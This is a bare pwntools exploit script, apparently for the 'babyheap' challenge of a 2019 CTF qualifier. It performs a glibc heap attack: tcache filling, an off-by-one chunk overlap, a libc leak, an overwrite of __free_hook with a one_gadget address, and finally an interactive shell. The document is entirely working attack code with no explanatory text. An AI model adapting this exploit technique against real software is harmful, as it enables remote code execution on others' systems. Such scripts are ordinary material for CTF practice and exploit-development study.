#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

#r = process('./babyheap')
#r = remote('localhost', 4000)
r = remote('babyheap.quals2019.oooverflow.io', 5000)
libc = ELF('./libc.so.6')

def add(size, s):
    r.sendlineafter('> ', 'M')
    r.sendlineafter('> ', str(size))
    r.sendlineafter('> ', s)

def remove(idx):
    r.sendlineafter('> ', 'F')
    r.sendlineafter('> ', str(idx))

def view(idx):
    r.sendlineafter('> ', 'S')
    r.sendlineafter('> ', str(idx))


add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
add(0xf8,'A')
remove(7)
remove(6)
remove(5)
remove(4)
remove(3)
remove(0)
remove(1)

remove(2)

add(0xf8,'A') #0
add(0xf8,'A'*0xf8 + '\x80') #1

remove(0)
add(0x178, 'A'*0x100)
view(0)
r.recvuntil('A'*0x100)
leak = u64(r.recvn(6).ljust(8, '\x00')) - 0x1e4ca0
print hex(leak)
libc.address = leak
magic = leak + 0xe2383

add(0xf8,'A') #2
add(0xf8,'A') #3
add(0xf8,'A') #4
#add(0xf8,'A') #5
#add(0xf8,'A') #6
remove(2)
add(0xf8,'A'*0xf8 + '\x80') #2
remove(3)
remove(4)
add(0x178,'A'*0x100 + p64(libc.symbols['__free_hook'])[:6]) #3
add(0xf8, 'A') #4
add(0xf8, p64(magic)[:6]) #5

remove(4)

r.interactive()
